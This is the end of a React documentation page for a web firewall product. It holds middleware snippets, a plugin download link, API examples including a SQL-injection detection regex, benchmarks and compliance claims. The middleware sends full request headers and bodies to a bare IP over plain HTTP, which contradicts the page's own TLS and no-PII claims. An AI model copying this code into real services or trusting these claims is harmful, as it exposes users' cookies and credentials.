                "ip": request.client.host if request.client else "127.0.0.1",
                "headers": dict(request.headers),
                "body": (await request.body()).decode("utf-8", errors="ignore")
            }
        }
        try:
            res = requests.post(
                "http://217.15.170.82/api/v1/analyze",
                json=payload,
                headers={"Authorization": "Bearer YOUR_MDEFENDER_API_KEY"},
                timeout=1.5
            )
            data = res.json()
            if data.get("decision") == "block":
                return HTMLResponse(content=data.get("block_page", "<h1>403 Forbidden</h1>"), status_code=403)
        except Exception:
            pass # Fail-open safe mechanism

        return await call_next(request)

app.add_middleware(MDefenderFastAPIMiddleware)`}
              />
            </div>
          )}

          {/* Section: PHP / Laravel SDK */}
          {activeSection === 'sdk-php' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(99, 102, 241, 0.15)', border: '1px solid rgba(99, 102, 241, 0.3)', color: '#818cf8', fontSize: '12px', fontWeight: '700' }}>PHP 7.4 - 8.3</span>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(16, 185, 129, 0.15)', border: '1px solid rgba(16, 185, 129, 0.3)', color: '#34d399', fontSize: '12px', fontWeight: '700' }}>Laravel Middleware Ready</span>
              </div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>PHP &amp; Laravel Integration</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
                Integrate MDefender Pro WAF into any standalone PHP script or Laravel framework middleware.
              </p>

              <h3 style={{ fontSize: '17px', fontWeight: '700', color: '#38bdf8', marginBottom: '10px' }}>Laravel Middleware (<code>app/Http/Middleware/MDefenderWaf.php</code>)</h3>
              <CodeBlock
                language="php"
                code={`<?php
namespace App\\Http\\Middleware;

use Closure;
use Illuminate\\Http\\Request;
use Illuminate\\Support\\Facades\\Http;

class MDefenderWaf
{
    public function handle(Request $request, Closure $next)
    {
        try {
            $response = Http::timeout(2)
                ->withToken(env('MDEFENDER_API_KEY'))
                ->post('http://217.15.170.82/api/v1/analyze', [
                    'domain'  => $request->getHost(),
                    'request' => [
                        'method'  => $request->method(),
                        'url'     => $request->fullUrl(),
                        'ip'      => $request->ip(),
                        'headers' => $request->headers->all(),
                        'body'    => $request->getContent()
                    ]
                ]);

            if ($response->json('decision') === 'block') {
                return response($response->json('block_page') ?? '<h1>403 Forbidden</h1>', 403);
            }
        } catch (\\Exception $e) {
            // Fail open safe mechanism
        }

        return $next($request);
    }
}`}
              />
            </div>
          )}

          {/* Section: WordPress Official Plugin */}
          {activeSection === 'sdk-wordpress' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{
                  padding: '4px 12px',
                  borderRadius: '20px',
                  background: 'rgba(59, 130, 246, 0.15)',
                  border: '1px solid rgba(59, 130, 246, 0.3)',
                  color: '#60a5fa',
                  fontSize: '12px',
                  fontWeight: '700'
                }}>Official WP Plugin</span>
                <span style={{
                  padding: '4px 12px',
                  borderRadius: '20px',
                  background: 'rgba(16, 185, 129, 0.15)',
                  border: '1px solid rgba(16, 185, 129, 0.3)',
                  color: '#34d399',
                  fontSize: '12px',
                  fontWeight: '700'
                }}>ML WAF + Malware Scanner</span>
              </div>

              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>WordPress Plugin &amp; ML Cloud Security</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
                Protect any WordPress site with the official <strong>MDefender Pro Security Plugin</strong>. It integrates your WordPress site directly with our <strong>5.2M+ Dataset Machine Learning Core</strong> for real-time WAF request blocking and deep malware scanning.
              </p>

              {/* Download Plugin Action Card */}
              <div style={{
                background: 'linear-gradient(135deg, rgba(37, 99, 235, 0.15), rgba(124, 58, 237, 0.15))',
                border: '1px solid rgba(59, 130, 246, 0.4)',
                borderRadius: '16px',
                padding: '24px 28px',
                marginBottom: '28px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'space-between',
                flexWrap: 'wrap',
                gap: '16px'
              }}>
                <div>
                  <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#ffffff', marginBottom: '6px', display: 'flex', alignItems: 'center', gap: '8px' }}>
                    <i className="fab fa-wordpress" style={{ color: '#38bdf8' }}></i> Download MDefender Pro Plugin
                  </h3>
                  <p style={{ fontSize: '13px', color: '#94a3b8', margin: 0 }}>
                    Latest Release: <code>v4.1.0</code> &bull; PHP 7.4 - 8.3 &bull; WordPress 5.8+ Compatible
                  </p>
                </div>
                <a
                  href={`${(import.meta.env.VITE_API_BASE || 'http://217.15.170.82').replace(/\/+$/, '')}/api/v1/wordpress/plugin`}
                  download
                  style={{
                    display: 'inline-flex',
                    alignItems: 'center',
                    gap: '8px',
                    padding: '12px 24px',
                    borderRadius: '10px',
                    background: 'linear-gradient(135deg, #2563eb, #7c3aed)',
                    color: '#ffffff',
                    fontSize: '14px',
                    fontWeight: '700',
                    textDecoration: 'none',
                    boxShadow: '0 4px 14px rgba(37, 99, 235, 0.35)'
                  }}
                >
                  <i className="fas fa-download"></i> Download mdefender-pro.zip
                </a>
              </div>

              {/* Step by step installation */}
              <div style={{
                background: 'linear-gradient(135deg, rgba(30, 41, 59, 0.7), rgba(15, 23, 42, 0.8))',
                border: '1px solid #334155',
                borderRadius: '16px',
                padding: '24px',
                marginBottom: '24px'
              }}>
                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '14px' }}>
                  <i className="fa-solid fa-plug" style={{ color: '#38bdf8', marginRight: '10px' }}></i>
                  How to Connect in 3 Steps
                </h3>
                <ol style={{ paddingLeft: '20px', fontSize: '13.5px', color: '#cbd5e1', lineHeight: '1.9', margin: 0 }}>
                  <li>
                    <strong>Upload &amp; Activate:</strong> In your WordPress admin panel, go to <code>Plugins &rarr; Add New &rarr; Upload Plugin</code>, choose <code>mdefender-pro.zip</code>, and click <strong>Activate</strong>.
                  </li>
                  <li>
                    <strong>Paste Your API Key:</strong> Navigate to <code>MDefender Pro &rarr; Settings</code> in your WP sidebar and enter your API Key from the MDefender dashboard.
                  </li>
                  <li>
                    <strong>Save &amp; Connect:</strong> Click <strong>Save &amp; Test Connection</strong>. The plugin connects to the MDefender backend via <code>/api/v1/wordpress/connect</code> and enables real-time ML protection immediately.
                  </li>
                </ol>
              </div>
            </div>
          )}

          {/* Section: REST API - Auth */}
          {activeSection === 'api-auth' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(56, 189, 248, 0.15)', border: '1px solid rgba(56, 189, 248, 0.3)', color: '#38bdf8', fontSize: '12px', fontWeight: '700' }}>REST API</span>
              </div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Authentication Endpoints</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
                Authenticate and manage API session tokens:
              </p>
              <div style={{ background: '#0c1222', border: '1px solid #1e293b', borderRadius: '12px', padding: '20px', marginBottom: '20px' }}>
                <div style={{ display: 'flex', alignItems: 'center', marginBottom: '10px' }}>
                  <MethodBadge method="POST" />
                  <code style={{ fontSize: '14px', fontWeight: '700', color: '#ffffff' }}>/api/v1/auth/login</code>
                </div>
                <p style={{ fontSize: '13px', color: '#94a3b8', margin: '0 0 14px' }}>Exchange user credentials for a JWT bearer token.</p>
                <CodeBlock language="json" code={`// Response 200 OK:
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "bearer",
  "user": {
    "id": "usr_94a7e2",
    "email": "admin@example.com",
    "role": "admin"
  }
}`} />
              </div>
            </div>
          )}

          {/* Section: REST API - Rules */}
          {activeSection === 'api-rules' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(168, 85, 247, 0.15)', border: '1px solid rgba(168, 85, 247, 0.3)', color: '#c084fc', fontSize: '12px', fontWeight: '700' }}>REST API</span>
              </div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Custom Rules CRUD API</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
                Manage custom regular expression security policies programmatically:
              </p>
              <div style={{ background: '#0c1222', border: '1px solid #1e293b', borderRadius: '12px', padding: '20px', marginBottom: '20px' }}>
                <div style={{ display: 'flex', alignItems: 'center', marginBottom: '10px' }}>
                  <MethodBadge method="GET" />
                  <code style={{ fontSize: '14px', fontWeight: '700', color: '#ffffff' }}>/api/v1/user/rules</code>
                </div>
                <CodeBlock language="json" code={`{
  "rules": [
    {
      "id": "rule_sqli_1",
      "name": "SQLi - Union Select Signature #1",
      "pattern": "(?i)(\\\\bUNION\\\\b.*\\\\bSELECT\\\\b)",
      "action": "block",
      "severity": "critical",
      "is_custom": false,
      "enabled": true
    }
  ]
}`} />
              </div>
            </div>
          )}

          {/* Section: REST API - Telemetry */}
          {activeSection === 'api-telemetry' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(16, 185, 129, 0.15)', border: '1px solid rgba(16, 185, 129, 0.3)', color: '#34d399', fontSize: '12px', fontWeight: '700' }}>REST API</span>
              </div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Logs &amp; Metrics Streams</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
                Stream real-time incident logs and aggregate security metrics:
              </p>
              <div style={{ background: '#0c1222', border: '1px solid #1e293b', borderRadius: '12px', padding: '20px', marginBottom: '20px' }}>
                <div style={{ display: 'flex', alignItems: 'center', marginBottom: '10px' }}>
                  <MethodBadge method="GET" />
                  <code style={{ fontSize: '14px', fontWeight: '700', color: '#ffffff' }}>/api/v1/user/logs?limit=50&amp;status=blocked</code>
                </div>
                <CodeBlock language="json" code={`{
  "logs": [
    {
      "id": "log_8f912c",
      "reference_id": "MDF-9A82D1",
      "ip": "185.220.101.4",
      "country": "Germany",
      "country_code": "DE",
      "attack_type": "SQL Injection",
      "path": "/api/books",
      "decision": "blocked",
      "timestamp": "2026-09-26T14:20:00Z"
    }
  ]
}`} />
              </div>
            </div>
          )}

          {/* Section: Custom Rules Builder */}
          {activeSection === 'custom-rules-guide' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{
                  padding: '4px 12px',
                  borderRadius: '20px',
                  background: 'rgba(99, 102, 241, 0.15)',
                  border: '1px solid rgba(99, 102, 241, 0.3)',
                  color: '#818cf8',
                  fontSize: '12px',
                  fontWeight: '700'
                }}>Tenant Policies</span>
              </div>

              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Authoring Custom Regex Policies</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
                Create custom regular expression patterns to block domain-specific threats, protect proprietary endpoints, or filter bot traffic.
              </p>

              <div style={{
                background: 'linear-gradient(135deg, rgba(30, 41, 59, 0.7), rgba(15, 23, 42, 0.8))',
                border: '1px solid #334155',
                borderRadius: '16px',
                padding: '24px',
                marginBottom: '24px'
              }}>
                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '12px' }}>
                  <i className="fa-solid fa-sliders" style={{ color: '#38bdf8', marginRight: '8px' }}></i>
                  PCRE Regex Syntax Guidelines
                </h3>
                <p style={{ fontSize: '13px', color: '#94a3b8', lineHeight: '1.6', marginBottom: '14px' }}>
                  Custom rules support standard PCRE regex with case-insensitive modifiers (<code>{"(?i)"}</code>) and word boundary constraints.
                </p>

                <CodeBlock
                  language="json"
                  code={`// Example Custom Rule Payload
{
  "name": "Block Proprietary Debug Scanner",
  "pattern": "(?i)(\\\\b(internal_debug|staging_admin|super_bypass)\\\\b)",
  "action": "block",
  "severity": "critical",
  "description": "Prevents unauthorized scans against internal debug routes."
}`}
                />
              </div>
            </div>
          )}

          {/* Section: Tenant Isolation */}
          {activeSection === 'tenant-isolation' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{
                  padding: '4px 12px',
                  borderRadius: '20px',
                  background: 'rgba(16, 185, 129, 0.15)',
                  border: '1px solid rgba(16, 185, 129, 0.3)',
                  color: '#34d399',
                  fontSize: '12px',
                  fontWeight: '700'
                }}>Zero-Downtime Sync</span>
              </div>

              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Tenant Isolation &amp; Policy Actions</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
                MDefender employs strict tenant isolation to guarantee privacy and ensure zero policy pollution across organizations.
              </p>

              <div style={{
                background: '#0a0e1a',
                border: '1px solid #1e293b',
                borderRadius: '16px',
                padding: '24px'
              }}>
                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '12px' }}>
                  <i className="fa-solid fa-lock" style={{ color: '#10b981', marginRight: '8px' }}></i>
                  Cryptographic Scoping Guarantee
                </h3>
                <p style={{ fontSize: '13px', color: '#94a3b8', lineHeight: '1.7', margin: 0 }}>
                  Custom rules created under your account are tagged exclusively with your <code>user_id</code> and <code>website_id</code>. They never bleed into other tenants' traffic, ensuring zero cross-tenant interference.
                </p>
              </div>
            </div>
          )}

          {/* Section: Attack Learning Lab & Zero-Downtime Retraining */}
          {activeSection === 'learning-lab' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{
                  padding: '4px 12px',
                  borderRadius: '20px',
                  background: 'linear-gradient(135deg, rgba(37,99,235,0.2), rgba(124,58,237,0.2))',
                  border: '1px solid rgba(59, 130, 246, 0.4)',
                  color: '#60a5fa',
                  fontSize: '12px',
                  fontWeight: '700'
                }}>Super Admin Feature</span>
                <span style={{
                  padding: '4px 12px',
                  borderRadius: '20px',
                  background: 'rgba(16, 185, 129, 0.15)',
                  border: '1px solid rgba(16, 185, 129, 0.3)',
                  color: '#34d399',
                  fontSize: '12px',
                  fontWeight: '700'
                }}>Active Learning Loop</span>
              </div>

              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Attack Learning Lab &amp; Feedback Hub</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
                Located at <code>/admin/learning</code>, the <strong>Attack Learning Lab</strong> empowers security teams to handle false positive reports, test new attack vectors in a live sandbox, and fine-tune the 5.2M dataset ML classifier with <strong>zero server downtime</strong>.
              </p>

              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '16px', marginBottom: '24px' }}>
                <div style={{ background: '#0c1222', border: '1px solid #1e293b', borderRadius: '12px', padding: '20px' }}>
                  <h4 style={{ color: '#38bdf8', margin: '0 0 8px', fontSize: '15px', fontWeight: '700' }}>
                    <i className="fa-solid fa-inbox" style={{ marginRight: '6px' }}></i> Reports Inbox
                  </h4>
                  <p style={{ fontSize: '12.5px', color: '#94a3b8', lineHeight: '1.6', margin: 0 }}>
                    Review flagged false positive submissions directly from users. 1-click whitelist creation instantly bypasses verified legitimate requests across all edge nodes.
                  </p>
                </div>

                <div style={{ background: '#0c1222', border: '1px solid #1e293b', borderRadius: '12px', padding: '20px' }}>
                  <h4 style={{ color: '#a78bfa', margin: '0 0 8px', fontSize: '15px', fontWeight: '700' }}>
                    <i className="fa-solid fa-flask-vial" style={{ marginRight: '6px' }}></i> Attack Sandbox
                  </h4>
                  <p style={{ fontSize: '12.5px', color: '#94a3b8', lineHeight: '1.6', margin: 0 }}>
                    Simulate complex SQLi, XSS, and RCE chains interactively. Inspect sub-millisecond risk scores, vector tokens, and decision engine breakdown in real-time.
                  </p>
                </div>

                <div style={{ background: '#0c1222', border: '1px solid #1e293b', borderRadius: '12px', padding: '20px' }}>
                  <h4 style={{ color: '#34d399', margin: '0 0 8px', fontSize: '15px', fontWeight: '700' }}>
                    <i className="fa-solid fa-rotate" style={{ marginRight: '6px' }}></i> Zero-Downtime Retraining
                  </h4>
                  <p style={{ fontSize: '12.5px', color: '#94a3b8', lineHeight: '1.6', margin: 0 }}>
                    Incorporate verified missed attacks into the active ML training corpus. Trigger incremental SGD model training with hot reload without restarting backend servers.
                  </p>
                </div>
              </div>
            </div>
          )}

          {/* Section: Latency & Benchmarks */}
          {activeSection === 'benchmarks' && (
            <div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Latency, Throughput &amp; Benchmarks</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
                MDefender Pro is engineered for high-concurrency production workloads with sub-millisecond execution overhead:
              </p>

              <div style={{
                background: '#0c1222',
                border: '1px solid #1e293b',
                borderRadius: '12px',
                padding: '20px',
                marginBottom: '24px',
                overflowX: 'auto'
              }}>
                <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '13.5px' }}>
                  <thead>
                    <tr style={{ background: '#090d18', textAlign: 'left', borderBottom: '1px solid #334155' }}>
                      <th style={{ padding: '12px 16px', color: '#f8fafc' }}>Component</th>
                      <th style={{ padding: '12px 16px', color: '#f8fafc' }}>Average Latency</th>
                      <th style={{ padding: '12px 16px', color: '#f8fafc' }}>p99 Latency</th>
                      <th style={{ padding: '12px 16px', color: '#f8fafc' }}>Throughput</th>
                    </tr>
                  </thead>
                  <tbody>
                    <tr style={{ borderBottom: '1px solid #1e293b' }}>
                      <td style={{ padding: '12px 16px', fontWeight: '700', color: '#f1f5f9' }}>2,000 Regex Lookup</td>
                      <td style={{ padding: '12px 16px', color: '#38bdf8', fontWeight: '700' }}>0.12 ms</td>
                      <td style={{ padding: '12px 16px', color: '#60a5fa' }}>0.28 ms</td>
                      <td style={{ padding: '12px 16px', color: '#34d399' }}>65,000 req/sec</td>
                    </tr>
                    <tr style={{ borderBottom: '1px solid #1e293b' }}>
                      <td style={{ padding: '12px 16px', fontWeight: '700', color: '#f1f5f9' }}>5.2M Dataset ML Inference</td>
                      <td style={{ padding: '12px 16px', color: '#38bdf8', fontWeight: '700' }}>0.34 ms</td>
                      <td style={{ padding: '12px 16px', color: '#60a5fa' }}>0.55 ms</td>
                      <td style={{ padding: '12px 16px', color: '#34d399' }}>48,000 req/sec</td>
                    </tr>
                    <tr>
                      <td style={{ padding: '12px 16px', fontWeight: '700', color: '#f1f5f9' }}>Total End-to-End Decision</td>
                      <td style={{ padding: '12px 16px', color: '#10b981', fontWeight: '800' }}>&lt; 0.85 ms</td>
                      <td style={{ padding: '12px 16px', color: '#10b981', fontWeight: '800' }}>&lt; 1.40 ms</td>
                      <td style={{ padding: '12px 16px', color: '#34d399', fontWeight: '800' }}>50,000+ req/sec</td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {/* Section: SOC 2 & GDPR Compliance */}
          {activeSection === 'compliance' && (
            <div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>SOC 2 &amp; GDPR Data Privacy</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
                MDefender Pro follows enterprise security principles to ensure sensitive customer data is never compromised:
              </p>

              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '16px' }}>
                <div style={{ background: '#0c1222', border: '1px solid #1e293b', borderRadius: '12px', padding: '20px' }}>
                  <h4 style={{ color: '#10b981', margin: '0 0 8px', fontSize: '15px', fontWeight: '700' }}>
                    <i className="fa-solid fa-user-shield" style={{ marginRight: '6px' }}></i> No PII Storage
                  </h4>
                  <p style={{ fontSize: '13px', color: '#94a3b8', lineHeight: '1.6', margin: 0 }}>
                    Passwords, auth tokens, credit card numbers, and session cookies are sanitized and discarded in-memory before evaluation.
                  </p>
                </div>

                <div style={{ background: '#0c1222', border: '1px solid #1e293b', borderRadius: '12px', padding: '20px' }}>
                  <h4 style={{ color: '#38bdf8', margin: '0 0 8px', fontSize: '15px', fontWeight: '700' }}>
                    <i className="fa-solid fa-lock" style={{ marginRight: '6px' }}></i> Encrypted In-Transit
                  </h4>
                  <p style={{ fontSize: '13px', color: '#94a3b8', lineHeight: '1.6', margin: 0 }}>
                    All telemetry beacons and synchronization calls utilize TLS 1.3 encryption with HMAC-SHA256 authenticated API tokens.
                  </p>
                </div>
              </div>
            </div>
          )}

          {/* Section: FAQs */}
          {activeSection === 'faqs' && (
            <div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Frequently Asked Questions</h1>
              
              <div style={{ display: 'flex', flexDirection: 'column', gap: '16px', marginTop: '24px' }}>
                {[
                  {
                    q: 'How does the 5.2M dataset ML model differ from static regex rules?',
                    a: 'Static rules match exact known signatures. The 5.2M dataset ML model vectorizes structural character n-grams and calculates statistical anomaly probability, enabling it to stop never-before-seen zero-day exploits and polymorphic bypasses.'
                  },
                  {
                    q: 'Does MDefender Pro add noticeable latency to HTTP requests?',
                    a: 'No. Both the 2,000 regex rules and the linear SGD ML classifier evaluate in-memory, averaging under 0.85ms per request.'
                  },
                  {
                    q: 'What happens if the backend WAF service experiences a temporary timeout?',
                    a: 'The SDK has a built-in fail-open safety mechanism (default 50ms). If a telemetry timeout occurs, traffic passes safely without blocking legitimate customers.'
                  }
                ].map((faq, i) => (
                  <div
                    key={i}
                    style={{
                      background: '#0c1222',
                      border: '1px solid #1e293b',
                      borderRadius: '12px',
                      padding: '20px'
                    }}
                  >
                    <h3 style={{ fontSize: '15px', fontWeight: '700', marginBottom: '8px', color: '#ffffff' }}>
                      {faq.q}
                    </h3>
                    <p style={{ fontSize: '13px', lineHeight: '1.6', color: '#94a3b8', margin: 0 }}>
                      {faq.a}
                    </p>
                  </div>
                ))}
              </div>
            </div>
          )}
        </main>
      </div>
    </div>
  )
}
